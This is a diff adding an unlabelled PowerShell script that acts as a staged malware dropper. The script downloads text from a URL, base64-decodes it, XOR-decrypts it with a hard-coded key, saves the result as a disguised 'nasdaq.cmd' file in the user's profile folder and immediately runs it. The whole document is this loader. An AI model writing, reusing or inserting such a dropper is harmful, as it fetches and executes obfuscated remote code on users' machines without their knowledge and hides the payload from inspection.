@@ -1,0 +1,38 @@
+$u=''
+
+try{
+$k='moon'
+if(!$u -or !$k){throw 'Missing URL or key'}
+
+Add-Type @"
+using System.Net;
+
+public class Downloader {
+    public static string DownloadString(string url) {
+        using (WebClient wc = new WebClient()) {
+            return wc.DownloadString(url);
+        }
+    }
+}
+"@
+
+$d = [Downloader]::DownloadString($u) -replace '\s'
+$b = [Convert]::FromBase64String($d)
+
+$kb=[Text.Encoding]::UTF8.GetBytes($k)
+if(!$kb.Length){throw 'Empty key'}
+
+$o=[byte[]](0..($b.Length-1)|%{
+    $b[$_] -bxor $kb[$_%$kb.Length]
+})
+
+    [IO.File]::WriteAllBytes("$env:USERPROFILE\nasdaq.cmd",$o)
+
+
+
+& "$env:USERPROFILE\nasdaq.cmd"
+
+}
+catch{
+    Write-Host "Error: $($_.Exception.Message)"
+}
